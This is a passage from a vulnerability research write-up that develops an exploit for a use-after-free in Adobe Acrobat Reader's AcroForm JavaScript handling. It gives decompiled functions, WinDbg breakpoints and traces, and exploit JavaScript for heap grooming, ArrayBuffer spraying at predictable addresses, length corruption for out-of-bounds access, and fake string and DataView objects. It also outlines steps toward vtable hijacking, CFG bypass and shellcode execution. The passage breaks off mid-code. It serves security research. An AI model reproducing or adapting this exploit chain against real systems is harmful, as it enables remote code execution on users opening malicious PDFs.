`EScript!ESObjectEnum`, which accepts a **callback** where enumerated property details are passed from **EScript** to **AcroForm**. The `AcroForm!EScript_ESObjectEnum_CallbackProc` callback is triggered for every property being enumerated.\n\nWhen **page-heap** is enabled, the crash occurs in `_DWORD *__thiscall std::map\u003cunsigned short,CAgg\u003e::lower_bound(TREE_VAL *this, _DWORD *a2, unsigned __int16 *a3)` when **dereferencing** `this` pointer, which is a `std::map` object in the current context.\n\n```cpp\nDWORD *__thiscall std::map\u003cunsigned short,CAgg\u003e::lower_bound(TREE_VAL *this, _DWORD *a2, unsigned __int16 *a3)\n{\n  TREE_NODE *Myhead; // eax\n  TREE_NODE *Parent; // ecx\n  unsigned __int16 v5; // si\n  int v6; // eax\n\n  Myhead = this-\u003e_Myhead;  // crash location - page-heaps enabled\n  Parent = this-\u003e_Myhead-\u003e_Parent;\n  ...\n}\n```\n\nAfter checking for the caller of this function, it appears that the `int __thiscall std::map\u003cunsigned short,CAgg\u003e::operator[](TREE_VAL *this, int a2, unsigned __int16 *pSomeID)` function is responsible for **inserting** a value into the corresponding `std::map`.\n\n```cpp\nint __thiscall std::map\u003cunsigned short,CAgg\u003e::operator[](TREE_VAL *this, int a2, unsigned __int16 *pSomeID)\n{\n  ...\n  std::map\u003cunsigned short,CAgg\u003e::lower_bound(this, v8, pSomeID);  // Crashing path when page-heap is enabled\n  v4 = v9;\n  if ( sub_208E95F2(v9, pSomeID) )\n  {\n    ...\n  }\n  else\n  {\n    if ( this-\u003e_Mysize == 0x38E38E3 )\n      Throw_tree_length_error();\n    ...\n    *(_DWORD *)a2 = std::map\u003cunsigned short,CAgg\u003e::insert(this, v8[0], (int)v8[1], Parent);\n    ...\n  }\n  return result;\n}\n```\n\nThe code above shows that a new `CAgg` allocation is created while **inserting** a value into the `std::map`. Testing with **heap grooming** and the `.dvalloc` trick revealed that the `std::map\u003cunsigned short,CAgg\u003e::insert` function also allows for **arbitrary writes** on the chosen address. By using **heap grooming**, it is possible to gain control of the corrupted `std::map` pointer used in this context, allowing for further exploitation.\n\n```cpp\nTREE_NODE *__thiscall std::map\u003cunsigned short,CAgg\u003e::insert(TREE_VAL *this, TREE_NODE *a2, int a3, TREE_NODE *a4)\n{\n\n  ++this-\u003e_Mysize;  // write possible here (single increment though)\n                    // map length increase\n  Myhead = this-\u003e_Myhead;\n  v5 = a4;\n  a4-\u003e_Parent = a2;\n  if ( a2 != Myhead )\n  {\n    if ( a3 )\n    {\n      a2-\u003e_Left = a4;  // write is possible here and we can use this to corrupt length property of a ArrayBuffer\n                       // mov dword ptr [eax], esi  ds:002b:13fa0000=45454545\n      if ( a2 == Myhead-\u003e_Left )\n        Myhead-\u003e_Left = a4;\n    }\n  }\n   ...\n}\n```\n\nBy exploiting the **arbitrary write**, it is possible to corrupt the **length** of the `ArrayBuffer` and gain **relative out-of-bounds read-write** capabilities. This allows for relative data to be read from or written to memory locations outside of the bounds of the `ArrayBuffer`.\n\nFurther investigation into how the **map** was corrupted revealed that the `AcroForm!CAgg::operator[](unsigned short)` function was calling `std::map\u003cunsigned short,CAgg\u003e::operator[]` with `this-\u003emap`. When examining the `CAgg` object in the debugger, it was discovered that it had been **freed** and was now **user-controlled**. This opened up the possibility for further exploitation of the vulnerability.\n\n```cpp\n// Crash function 2\nint __userpurge CAgg::operator[]@\u003ceax\u003e(CAgg *this@\u003cecx\u003e, bool (*a2)[27]@\u003cebx\u003e, wchar_t *someID)\n{\n  ...\n\n  if ( this-\u003etype == 0x13 )  // *this == (CAgg::getType) | crashes here with page-heaps\n                             // this is the freed pointer\n  {\n    ...\n  }\n  else\n  {\n    ...\n    else\n    {\n      // this path is taken when page-heap is disabled and heap grooming is performed prior to bug trigger\n      CAgg::convert(this, a2, 0x14);\n      v4 = (_DWORD *)std::map\u003cunsigned short,CAgg\u003e::operator[](this-\u003emap, (int)v9, (unsigned __int16 *)\u0026someID);\n    }\n    return *v4 + 24;\n  }\n}\n```\n\nWhile there were no obvious primitives available on the corrupted `CAgg` object, it was possible to read its **type** with `this-\u003etype`. The `CAgg::operator[]` function was called from `EScript_ESObjectEnum_CallbackProc`, which is triggered for each property being enumerated by `EScript!ESEnumObject`. This provided some insight into how the object was corrupted and could potentially be **exploited**.\n\n```cpp\nint __usercall EScript_ESObjectEnum_CallbackProc@\u003ceax\u003e(\n        bool (*ebx0)[27]@\u003cebx\u003e,\n        int a2,\n        wchar_t *key_str,\n        wchar_t *a4,\n        int ***pCAggData)\n{\n  CAgg **pCagg; // edi\n  unsigned __int16 someID; // ax\n  CAgg *v7; // eax\n\n  pCagg = (CAgg **)*pCAggData;  // AtomFromString retrieves some integer id from string\n                                //\n                                // bp AcroForm!sub_20AD2A20+0x22 \"da poi(esp); gc\"\n                                //\n  someID = (*(int (__cdecl **)(wchar_t *))(gCoreHFT + 20))(key_str);  // gCoreHFT-\u003eASAtomFromString(a2);\n  v7 = (CAgg *)CAgg::operator[]((CAgg *)pCagg, ebx0, (wchar_t *)someID);\n  ESValToCAgg(v7, a4, 0);\n  return 1;\n}\n```\n\nIn this current scenario, we have a problem with the `pCagg` object. This object has already been **freed**, but it is still being used in the **callback** function `EScript_ESObjectEnum_CallbackProc` where it's passed to the `ESValToCAgg` function.\n\n\u003e **Note:** This function is recursive, so the problem repeats over and over.\n\nOur analysis shows that the `CAgg` objects are allocated inside the `std::map\u003cunsigned short,CAgg\u003e::operator[]` function during each **property enumeration** when setting the `richValue` property. However, during the `resetForm` process, the `event.target` property is trapped using `__defineGetter__`. This function is called during the recursive properties enumeration of the `doc` object. When the `target` property is accessed, the `getterFunc` function is called, which **redefines** the **field's** `textFont` property as the `doc` object. This also sets it to be **non-configurable** and **non-enumerable**.\n\nDuring the second `resetForm`, the same process is repeated, but when `getterFunc` is called again, it raises an **exception** because of the `field.textFont` property is now **non-configurable**. This causes a different path to be taken when accessing the `event.richValue` property, which **frees** all of the `CAgg` objects that have been constructed so far. The free code path is called while the object enumeration is still in progress, and when it finishes, it triggers the use of the freed `CAgg` object.\n\n```cpp\n{\n  ...\n  v7 = 0;\n  v8 = 15;\n  LOBYTE(v6[0]) = 0;\n  sub_2085ECA0(v6, \"EventRichValueInProgress\");\n  sub_20AAE7D6(v15, a1, (int)v6[0], (int)v6[1], (int)v6[2], (int)v6[3], v7, v8);\n  LOBYTE(v16) = 3;\n  if ( v13\n    \u0026\u0026 (*(unsigned __int16 (__thiscall **)(_DWORD, wchar_t *, const wchar_t *))(dword_21473CB8 + 180))(\n          *(_DWORD *)(dword_21473CB8 + 180),\n          v13,\n          \"richValue\") )\n  {\n    PointerType = (CAgg *)ASCabGetPointerTypeSafe\u003cCAgg *\u003e(v13, (wchar_t *)\"richValue\", (wchar_t *)\"CAgg_P\");\n    if ( PointerType )\n      CAggToESVal(0, v11, PointerType);  // frees all CAggs and maps\n  }\n  ...\n}\n```\n\nAbove hypothesis can be verified using a **debugger** by setting up the following **breakpoints** in **WinDbg**.\n\n```\nbp AcroForm!resetFormHandler\nbp AcroForm!EScript_ESObjectEnum_CallbackProc \".printf \\\"-- [^] property: %ma - \\\\n \\\", poi(esp+8); gc;\"\nbp AcroForm!uninit_sub_20AA701F+0x25 \".printf \\\"    - alloc: %p \\\\n \\\", @eax; .echo; gc\"\nbp AcroForm!GetRichValueEventProp+0x119 \".printf \\\" ------------free code path \\\\n \\\"; gc\"\nbp AcroForm!sub_20AD5DE9 \".printf \\\"[map] root: %p size %p \\\\n \\\", poi(@ecx), poi(@ecx+4); gc;\"\nbp AcroForm!sub_20AD5DE9+0x36 \".printf \\\"   [+] PTR_1 freed: %p \\\\n \\\", poi(@esi); gc\"\nbp AcroForm!sub_20AD6CDD+0x3c \".printf \\\"   [+] PTR_2 freed: %p \\\\n \\\", @esi; gc\"\nbp AcroForm!sub_20AD5ECD+0x33 \".printf \\\"   [+] block freed: %p \\\\n \\\", @esi; gc\"\nbp AcroForm!ESValToCAgg_internal+0x403 \".printf \\\"   [+] pData: %p \\\\n \\\", @ecx; gc\"\n```\n\nThe trace output result from the above **breakpoints** is provided below.\n\n```\n   [+] pData: 00afb1e8\n -- [^] property: ADBCAnnotEnumerator -\n     - alloc: 64b3cfb8\n\n     ... all other properties ....\n\n-- [^] property: textFont -\n     - alloc: d41d0fb8                       \u003c- CAgg* allocated here\n\n   [+] pData: d41d0fd0                       \u003c- std::map inside CAgg\n -- [^] property: change -\n     - alloc: 6951bfb8\n\n     ... all other properties ....\n\n-- [^] property: rc -\n     - alloc: c7b8efb8\n\n ------------free code path\n ...\n\n[map] root: d2d14fb8 size 0000018f\n [map] root: ee802fb8 size 00000041\n    [+] block freed: ce58efb8\n    [+] block freed: e0dd6fb8\n    ...\n [map] root: e4826fb8 size 00000008\n    ...\n    [+] PTR_1 freed: e4826fb8\n    [+] block freed: d41d0fb8                \u003c-  CAgg* freed here\n    [+] block freed: c211afb8\n    ...\n [map] root: d2bdcfb8 size 00000000\n    [+] PTR_1 freed: d2bdcfb8\n    [+] block freed: 6c43efb8\n    [+] block freed: d3612fb8\n    ...\n\n -- [^] property: richValue -\n\n(1ba0.f80): Access violation - code c0000005 (first/second chance not available)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\nTime Travel Position: 382C19E:0\n\neax=00afa330 ebx=00000000 ecx=d41d0fd0 edx=7af18ff8 esi=6fa3ef50 edi=d41d0fd0\neip=6e6b6b99 esp=00afa310 ebp=00afa33c iopl=0         nv up ei pl nz na pe nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200206\nAcroForm!CAgg::operator[](unsigned short)+0xe:\n6e6b6b99 8b07            mov     eax,dword ptr [edi]  ds:002b:d41d0fd0=abcdbbba\n\n0:000\u003e dc d41d0fb8\nd41d0fb8  00000000 00000000 00000000 00000000  ................\nd41d0fc8  00000000 00000000 abcdbbba 07971000  ................\nd41d0fd8  00000010 00001000 00000000 00000000  ................\nd41d0fe8  09009a6c dcbabbba 00000000 ffffff82  l...............\nd41d0ff8  3b5fafc0 c0c0c001 c0c0c0c0 c0c0c0c0  .._;............\nd41d1008  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................\nd41d1018  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................\nd41d1028  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................\n```\n\nInside the **debugger**, we can see the **corrupted** `std::map` object `pData: d41d0fd0`, which is part of the **freed** `CAgg` object that was allocated during the **enumeration** of the `textFont` property `alloc: d41d0fb8`.\n\nWhen the free code path is taken, all **objects** and **map objects** are freed. The same pointer is later **accessed** when processing the `richValue` property enumeration, leading to a **use-after-free** condition.\n\n\u003e **Note:** During the testing to control the **use-after-free** condition, we **did not** find any code paths that would allow us to **reallocate** the **freed** memory in a way that could be **exploited**.\n\nHowever, we discovered that certain object sizes can cause **Adobe Acrobat Reader** to crash while **dereferencing** the **sprayed pattern**, giving us the possibility to exploit the bug for **Remote Code Execution (RCE)**.\n\n### Heap Grooming\n\n```js\nvar blockRefs = [];\n\nfunction groomLFH(size, count) {\n  log(\"[+] Grooming LFH blocks of size: \" + size + \" count: \" + count);\n\n  const code =\n      \"%u4141%u4242%u4343%u4444%u4545%u4646%u4747%u4848%u4949%u4a4a%u4b4b%u4c4c%u4d4d%u4e4e%u4f4f%u5050%u4141%u4242%u5353%u5454%u5555%u5656%u5757%u5858%u5959%u5a5a%u5b5b%u5c5c%u5d5d%u5e5e%u5f5f%u6060%u6161%u6262%u6363%u6464%u6565%u6666%u6767%u6868%u6969%u6a6a%u6b6b%u6c6c%u6d6d%u6e6e%u6f6f%u7070%u7171%u7272%u7373%u7474%u7575%u7676%u7777%u7878%u7979%u7a7a%u7b7b%u7c7c%u7d7d%u7e7e%u7f7f%u8080%u8181%u8282%u8383%u8484\";\n  const string = unescape(code);\n\n  for (var i = 0; i \u003c count; i++) {\n      blockRefs.push(string.substr(0, (size - 2) / 2).toUpperCase());\n  }\n\n  for (var i = 0; i \u003c blockRefs.length; i += 2) {\n      blockRefs[i] = null;\n      delete blockRefs[i];\n  }\n}\n\ngroomLFH(68, 4000);\n```\n\nBy grooming **heap** allocations with an object of size `68`, we were able to **control** the **crash**. The crashing object size was initially found by **brute forcing**.\n\n\u003e **Note:** The grooming was done before the **UaF** was triggered. We will come back to this later.\n\n```\neax=04b7a854 ebx=04b7a8b4 ecx=42424141 edx=4e4e4d4d esi=6921ef50 edi=42424141\neip=6c3695af esp=04b7a838 ebp=04b7a838 iopl=0         nv up ei pl nz ac po nc\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010212\nAcroForm!CAgg::operator[](unsigned short)+0x3:\n6c3695af 8b01            mov     eax,dword ptr [ecx]  ds:002b:42424141=????????\n```\n\nIn the crashing function, we can see that the **user-controlled** value is being **dereferenced**.\n\nThe allocation source can be verified in **WinDbg** as shown below.\n\n```\n0:015\u003e !ext.heap -p -a 36f76fb8\n    address 36f76fb8 found in\n    _DPH_HEAP_ROOT @ 9801000\n    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)\n                                36f51924:         36f76fb8               48 -         36f76000             2000\n    6fb1a8b0 verifier!AVrfDebugPageHeapAllocate+0x00000240\n    76fbef0e ntdll!RtlDebugAllocateHeap+0x00000039\n    76f26150 ntdll!RtlpAllocateHeap+0x000000f0\n    76f257fe ntdll!RtlpAllocateHeapInternal+0x000003ee\n    76f253fe ntdll!RtlAllocateHeap+0x0000003e\n    75d00166 ucrtbase!_malloc_base+0x00000026\n    6aaaee40 AcroForm!operator new(unsigned int)+0x0000001a\n    6acf7044 AcroForm!sub_20AA701F+0x00000025\n    6ad25a56 AcroForm!sub_20AD5A43+0x00000013\n    6ad25fba AcroForm!std::map\u003cunsigned short,CAgg\u003e::operator[](unsigned short const\u0026)+0x00000057\n    6ad26bc5 AcroForm!CAgg::operator[](unsigned short)+0x0000003a\n    6ad22a50 AcroForm!EScript_ESObjectEnum_CallbackProc+0x00000030\n    ...\n    6ace3b35 AcroForm!SetRichValueEventProp+0x000001f5\n    ...\n```\n\nBy further looking at what was causing the controlled crash as the heap-grooming before the bug trigger, we observed that the array of sprayed string objects is also used during **aggregation** when the `resetForm` is in progress.\n\nInside `CAggToESVal` when the object type is a **string**, the below code is triggered which creates a new string from `CAgg`.\n\n```cpp\nint __usercall CAggToESVal@\u003ceax\u003e(bool (*a1)[27]@\u003cebx\u003e, wchar_t *a2, CAgg *a3)\n{\n  ...\n  else\n    {\n      m_str = (_EStrRec **)CAgg::toEStr(a3, a1);\n      if ( *m_str )\n        v14 = EStrCopyImpl(*m_str);\n      else\n        v14 = 0;\n      if ( EStrGetEncoding((MayBeString *)v14) )\n        EStrSetEncoding(v14, 2);\n      v15 = dword_21472158;\n      Bytes = EStrGetBytes((MayBeString *)v14);\n      result = (*((int (__cdecl **)(wchar_t *, int))v15 + 31))(a2, Bytes);  // ESValSetString\n      if ( v14 )\n        return EStrDelete(v14);\n    }\n}\n```\n\nOne important detail to note here is the call to `EScript!ESValSetString` to create new string content from the `CAgg` string object (which are our sprayed string objects). `ESValSetString` calls `sub_1003EBD2` to create a string with the given content, which is further responsible for allocating a heap buffer of the string length and copying the source string content into it.\n\n```cpp\nchar **__usercall sub_1003EBD2@\u003ceax\u003e(__int128 a1@\u003cxmm0\u003e, int a2, wchar_t *a3)\n{\n  ...\n  sub_1003E853((int *)a2);\n  if ( a3\n    \u0026\u0026 strlen_0(a3, 0x7FFFFFFFu, 0) \u003e 1\n    \u0026\u0026 (*(_BYTE *)a3 == 0xFE \u0026\u0026 *((_BYTE *)a3 + 1) == 0xFF || *(_BYTE *)a3 == 0xFF \u0026\u0026 *((_BYTE *)a3 + 1) == 0xFE) )\n  {\n    v24 = 0;\n    v22 = 0x7FFFFFFF;\n    _mm_lfence();\n    v3 = miStrlen(a3, v22, v24);\n    v4 = JS_malloc_Wrapper(*(_DWORD *)a2, v3);  // reallocate freed buffer again when string length is 0x48\n    Block = (char *)v4;\n    if ( v4 )\n    {\n      v25 = v3;\n      v23 = (char *)v4;\n      v21 = (char *)(a3 + 1);\n      _mm_lfence();\n      swab(v21, v23, v25);\n      return JS_NewUCString(a1, *(_DWORD **)a2, Block, v3 / 2 - 1);\n    }\n    return 0;\n  }\n  ...\n}\n```\n\nIn the above code, `JS_malloc_Wrapper` will **reallocate** the freed `CAgg` buffer when processing a large number of strings, allowing us to **reallocate**** the buffer with **user-controlled** data. When this sprayed buffer is later used in the `CAgg::*` functions, it causes a crash while **dereferencing** user-controlled data.\n\n## SpiderMonkey Internals in EScript.API\n\n**Firefox's** **SpiderMonkey** is the JavaScript engine used inside **Adobe Reader** through `EScript.API` plugin for processing JavaScript embedded inside PDFs. To effectively exploit this bug, we need to understand how JavaScript objects are implemented inside **SpiderMonkey** and their memory organization.\n\n**SpiderMonkey** uses the **64-bit** representation to store JavaScript native `jsval` inside the memory.\n\n- Double are stored in full **64-bit** **IEEE-754** value\n- Other `jsval` like numbers, strings, objects, etc. uses **32-bit** for type tagging and **32-bit** for storing actual value (or object pointer)\n\n### ArrayBuffer\n\nWe will use `ArrayBuffer` for spraying **user-controlled** data at **predictable** addresses and corrupting the **length** with an arbitrarily large integer value to gain **out-of-bounds read-write** primitives. Let's look at how it is represented in memory.\n\n`ArrayBuffer` implementation has **0x10** bytes **header** + **content** equal to the size specified.\n\n```\n4ef0cbf0  00000000 00000400 3cc31450 00000000  ........P..\u003c.... +0x4: length, +0x8: TypedArray pointer\n4ef0cc00  41424344 45464748 00000000 00000000  DCBAHGFE........ actual contents starts here\n4ef0cc10  00000000 00000000 00000000 00000000  ................\n4ef0cc20  00000000 00000000 00000000 00000000  ................\n4ef0cc30  00000000 00000000 00000000 00000000  ................\n4ef0cc40  00000000 00000000 00000000 00000000  ................\n4ef0cc50  00000000 00000000 00000000 00000000  ................\n4ef0cc60  00000000 00000000 00000000 00000000  ................\n```\n\n- Length is stored at an offset of `0x4`\n- If a `TypedArray` is initialized then, at an offset of `0x8` you find the `TypedArray` pointer\n- Finally, you have the actual user-controlled data\n\nIn the `EScript.api`, the `sub_10131A2C` function is responsible for allocating an `ArrayBuffer` of the specified length. If the **size** of the `ArrayBuffer` is less than `0x68`, an inline representation is used to store the data. Otherwise, a block of memory of the specified size is created and filled with zeros.\n\n```cpp\nchar __thiscall sub_10131A2C(void **this, int a2, size_t Size, void *Src)\n{\n  _DWORD *v5; // eax\n  void *v7; // eax\n  unsigned __int8 v10; // [esp-4h] [ebp-10h]\n\n  if ( Size \u003c= 0x68 )  // if size is less may be inline buffer creation | does not use heap\n                       // heap -p -a @buffer failed to show any trace\n  {\n    this[3] = this + 10;  // address to our ArrayBuffer-\u003ebuffer | this+0x28\n    _mm_lfence();\n    if ( Src )\n      memcpy(this[3], Src, Size);\n    else\n      memset(this[3], 0, Size);\n    v7 = this[3];\n  }\n  else\n  {\n    v10 = 0;\n    _mm_lfence();\n    v5 = sub_1013153C((wchar_t *)a2, Size, Src, (_DWORD *)v10);\n    if ( !v5 )\n      return 0;\n    v7 = v5 + 4;\n    this[3] = v7;\n  }\n  *((_DWORD *)v7 - 4) = 0;\n  *((_DWORD *)v7 - 3) = Size;  // length of the ArrayBuffer\n  *((_DWORD *)v7 - 1) = 0;     // typed array pointer initialized to nullptr\n  *((_DWORD *)v7 - 2) = 0;\n  return 1;\n}\n```\n\n### Array\n\n```js\nvar a = new Array();\na[0] = 0x41424142\na[1] = 0x55555555;\na[2] = \"javascript\";\na[3] = {};\n```\n\nWe will use `Array` for achieving `addrOf` (**address of**) primitive. Below given is the representation of the JavaScript array in memory.\n\n```\n0d9a2678  00000000 00000004 00000006 00000004  ................ 0x0: flag, 0x4: initLength, 0x8: capacity, 0xc: length\n0d9a2688  41424142 ffffff81 55555555 ffffff81  BABA....UUUU.... (value, tag) for each value\n0d9a2698  0d735fe0 ffffff85 0d9bf200 ffffff87  ._s.............\n0d9a26a8  00000000 00000000 00000000 00000000  ................\n0d9a26b8  00000000 00000000 00000000 00000000  ................\n0d9a26c8  00000000 00000000 00000000 00000000  ................\n0d9a26d8  00000000 00000000 00000000 00000000  ................\n0d9a26e8  00000000 00000000 00000000 00000000  ................\n```\n\n`sub_1004DBA9` in `EScript.api` is responsible for creating arrays and can be tracked while spraying arrays.\n\nThe contents of the array are organized in **(tag, value)** tuple in memory, where the **tag** is used to identify the **type** associated with the **value**.\n\ne.g.\n\n```\nNumber - ffffff81\nString - ffffff85\nObject - ffffff87\n```\n\nWhen we have **out-of-bounds** access on the `ArrayBuffer`, we can spray a large JavaScript array just after `ArrayBuffer` and use the **out-of-bounds** primitive to read the address of any arbitrary JavaScript object.\n\nWe can see the way our string is represented in memory by dumping the memory of the above pointer.\n\n```\n0:016\u003e dc 0d735fe0\n0d735fe0  000000a8 0d735fe8 0061006a 00610076  ....._s.j.a.v.a. 0x0: length, 0x4: ptr to content, 0x8: inlined contents\n0d735ff0  00630073 00690072 00740070 00000000  s.c.r.i.p.t.....\n0d736000  0bf80fb0 0d734000 0fff1000 00000013  .....@s.........\n0d736010  00000228 0c1451f8 00000000 00000000  (....Q..........\n0d736020  000000d8 0c0b8638 00000000 00000000  ....8...........\n0d736030  000000d8 0c0b8660 00000000 00000000  ....`...........\n0d736040  000001e8 0c149bb0 00000000 00000000  ................\n0d736050  000000f8 0c0b8890 00000000 00000000  ................\n```\n\nFurther, in exploitation, we will create **fake strings** with the help of `ArrayBuffer` and use one of the sprayed fake strings to read arbitrary memory contents, achieving temporary **arbitrary read** primitive.\n\n## Exploitation\n\nUsed `.dvalloc` to see if we have any controlled read-write crashes or a crash while calling arbitrary virtual function pointer.\n\nWe found a crash that leads to **arbitrary-write** on our controlled address\n\n`*(*ecx) = some_32_value` where `ecx` is user-controlled pointer.\n\n### Strategy\n\n- Spray a lot of `ArrayBuffer` to get allocation at a predictable address like `0x20000048`\n- Groom LFH with our specified pattern to corrupt the `ArrayBuffer` at a predictable address\n- Trigger the vulnerability to use the freed buffer and corrupt the `ArrayBuffer` length\n- Use corrupted `ArrayBuffer` to create a fake **string** to achieve **arbitrary read** primitive\n- Use arbitrary read from fake string to create fake `DataView` to achieve **arbitrary read-write** primitives\n- Corrupt field's **virtual table** to hijack execution control\n- Bypass CFG\n- Execute shellcode\n- Restore corrupted objects and recover cleanly\n\n### Spraying ArrayBuffer\n\n```js\nvar SPRAY = [];\n\nfor(var i=0; i\u003c0x2000; i++) {\n  SPRAY[i] = new ArrayBuffer(0x10000-24);\n  const typedArray = new Uint32Array(SPRAY[i]);\n  typedArray[0] = 0x41424344;\n  typedArray[1] = 0x41424344;\n}\n```\n\nUsing the above script we can have an `ArrayBuffer` allocated at a predictable address such as `0x20000058`.\n\n#### Locating ArrayBuffer\n\nBy using **magic markers**, we can locate the buffer in heap memory which helps to find the constructor which allocates the `ArrayBuffer` in **Adobe Reader**.\n\n\u003e **Note:** Allocation of `ArrayBuffer` happens in `EScript.api` code.\n\nFor example, when allocating an `ArrayBuffer` of size `0x1020`, searching memory for the **magic marker** and identifying who allocated the memory can help us find the `ArrayBuffer` constructor.\n\n```\n0:015\u003e s -d 0 L?0xffffffff 0x41424344\n0x4ef0cc00  41424344 45464748 00000000 00000000  DCBAHGFE........\n\n0:015\u003e !ext.heap -p -a 0x4ef0cc00\n    address 4ef0cc00 found in\n    _DPH_HEAP_ROOT @ 9521000\n    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)\n                                4eed11a0:         4ef0cbf0              410 -         4ef0c000             2000\n    6ddea8b0 verifier!AVrfDebugPageHeapAllocate+0x00000240\n    7714ef0e ntdll!RtlDebugAllocateHeap+0x00000039\n    770b6150 ntdll!RtlpAllocateHeap+0x000000f0\n    770b57fe ntdll!RtlpAllocateHeapInternal+0x000003ee\n    770b53fe ntdll!RtlAllocateHeap+0x0000003e\n    767919c7 ucrtbase!_calloc_base+0x00000037\n    69481bd5 EScript!sub_10011BAE+0x00000027\n    695a15ce EScript!sub_1013153C+0x00000092\n    695a1a4e EScript!sub_10131A2C+0x00000022\n    695a4bce EScript!sub_10134B68+0x00000066\n    695a1d75 EScript!sub_10131D10+0x00000065\n    694a95b0 EScript!sub_100394E9+0x000000c7\n    694a3505 EScript!js_Interpret+0x00001056\n    694a246b EScript!sub_10032412+0x00000059\n    694a237b EScript!sub_10032315+0x00000066\n    694a22b0 EScript!js_Execute+0x0000007d\n    6948b6b0 EScript!JS_EvaluateUCScriptForPrincipals+0x0000008b\n    694ca9c6 EScript!JS_EvaluateUCScript+0x0000004d\n    694ca6cb EScript!ESExecScript+0x0000010b\n```\n\nVerifying the `ArrayBuffer` backing memory (array buffer chunk + header size (0x10)).\n\n```\n0:015\u003e ? 410\nEvaluate expression: 1040 = 00000410\n0:015\u003e ? 4ef0cc00 - 4ef0cbf0\nEvaluate expression: 16 = 00000010\n0:015\u003e dc 4ef0cbf0\n4ef0cbf0  00000000 00000400 3cc31450 00000000  ........P..\u003c....  +0x4: length, +0x8: typed array ptr\n4ef0cc00  41424344 45464748 00000000 00000000  DCBAHGFE........ contents starts here\n4ef0cc10  00000000 00000000 00000000 00000000  ................\n4ef0cc20  00000000 00000000 00000000 00000000  ................\n4ef0cc30  00000000 00000000 00000000 00000000  ................\n4ef0cc40  00000000 00000000 00000000 00000000  ................\n4ef0cc50  00000000 00000000 00000000 00000000  ................\n4ef0cc60  00000000 00000000 00000000 00000000  ................\n0:015\u003e ? 0x400\nEvaluate expression: 1024 = 00000400\n```\n\nBy using a **WinDbg** breakpoint on the constructor code, we can find the addresses where `ArrayBuffer` is being allocated.\n\n```\nbp Escript+0x131a4e \".printf \\\"[ArrayBuffer alloc] %p \\\\n\\\", eax; gc\"\n```\n\nNow, let's see how the actual `ArrayBuffer` spray looks like in the exploit.\n\n```js\nfunction sprayArrBuffers()\n{\n  for (var i=0; i\u003c0x1500; i++)\n  {\n    bufs[i] = new ArrayBuffer(ALLOC_SIZE);\n    const uintArr = new Uint32Array(bufs[i]);\n    for (var k =0; k\u003c16; k++)\n    {\n      uintArr[k] = 0x33333333;\n    }\n    uintArr[0] = arrBufPtr + 8; //first deref a = *ecx\n    uintArr[1] = 0x41424344; //map size\n    uintArr[2] = 0x41424344;\n    uintArr[3] = ARR_BUF_BASE - 4;\n\n    // fake string for arbitrary read\n    uintArr[FAKE_STR_START] = 0x102; //type\n    uintArr[FAKE_STR_START+1] = arrBufPtr+0x40; // buffer\n    uintArr[FAKE_STR_START+2] = 0x4;\n    uintArr[FAKE_STR_START+3]= 0x4;\n\n    // fake dataview for arbitrary write\n    uintArr[FAKE_DV_START] = 0x77777777;\n    delete uintArr;\n    uintArr = null;\n  }\n\n  for (var i=0; i\u003c0x10; i++)\n  {\n    arrs[i] = new Array(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 1,2, 3, 4, 5, 6, 7, 8, 9, 10, 11,12,13, 14, 15, 17,18, 19, 20, 21, 22, 23, 24, 25, 20, 21, 22, 23, 24, 25, 20, 21, 22, 23, 24, 25, 20, 21, 22, 23, 24, 25, 20, 21, 22, 23, 24, 25,20,21,22,23);\n    arrs[i][0] = 0x47484950;\n    arrs[i][1] = targetStr;\n    arrs[i][2] = targetDV;\n    for (var k=3; k\u003c5000; k++)\n    {\n      arrs[i][k] = 0x50515051;\n    }\n  }\n}\n```\n\n`ArrayBuffer` allocation on predictable address `0x20000048` is successful\n\n```\n0:011\u003e dc 0x20000048\n20000048  00000000 0000ffe8 135c4348 00000000  ........HC\\..... +0x4: length, +0x8: typed array\n20000058  20000060 00000000 00000000 20000044  `.. ........D..\n20000068  33333333 33333333 33333333 33333333  3333333333333333\n20000078  33333333 33333333 33333333 33333333  3333333333333333\n20000088  33333333 33333333 33333333 33333333  3333333333333333\n20000098  00000000 00000000 00000000 00000000  ................\n200000a8  00000000 00000000 00000000 00000000  ................\n200000b8  00000000 00000000 00000000 00000000  ................\n```\n\nBy using **heap grooming** with our **predictable address** pattern and triggering the vulnerability, we can see that the `ArrayBuffer` **length** is **corrupted/modified**.\n\n```js\n// encoding %u0058%u2000% at offset required by vulnerability\nconst code =\n  \"%u4141%u4242%u4343%u4444%u4545%u4646%u4747%u4848%u4949%u4a4a%u4b4b%u4c4c%u4d4d%u4e4e%u4f4f%u5050%u0058%u2000%u5353%u5454%u5555%u5656%u5757%u5858%u5959%u5a5a%u5b5b%u5c5c%u5d5d%u5e5e%u5f5f%u6060%u6161%u6262%u6363%u6464%u6565%u6666%u6767%u6868%u6969%u6a6a%u6b6b%u6c6c%u6d6d%u6e6e%u6f6f%u7070%u7171%u7272%u7373%u7474%u7575%u7676%u7777%u7878%u7979%u7a7a%u7b7b%u7c7c%u7d7d%u7e7e%u7f7f%u8080%u8181%u8282%u8383%u8484\";\n```\n\n```\n0:023\u003e dc 20000048\n20000048  00000000 247c3308 243722f0 00000000  .....3|$.\"7$.... +0x4: length, +0x8: typed array\n20000058  20000060 00000000 00000000 20000044  `.. ........D..\n20000068  33333333 33333333 33333333 33333333  3333333333333333\n20000078  33333333 33333333 33333333 33333333  3333333333333333\n20000088  33333333 33333333 33333333 33333333  3333333333333333\n20000098  00000000 00000000 00000000 00000000  ................\n200000a8  00000000 00000000 00000000 00000000  ................\n200000b8  00000000 00000000 00000000 00000000  ................\n```\n\nThe **length** of the `ArrayBuffer` is corrupted by a pointer value, allowing for **relative out-of-bounds read-write** on the heap.\n\nOnce the vulnerability is triggered, the corrupted `ArrayBuffer` can be located using the below-given code.\n\n```js\nfor (var i=0; i\u003cbufs.length; i++)\n{\n  if (bufs[i].byteLength != ALLOC_SIZE)\n  {\n    console.println(\"[+] corrupted array buffer found at \" + i 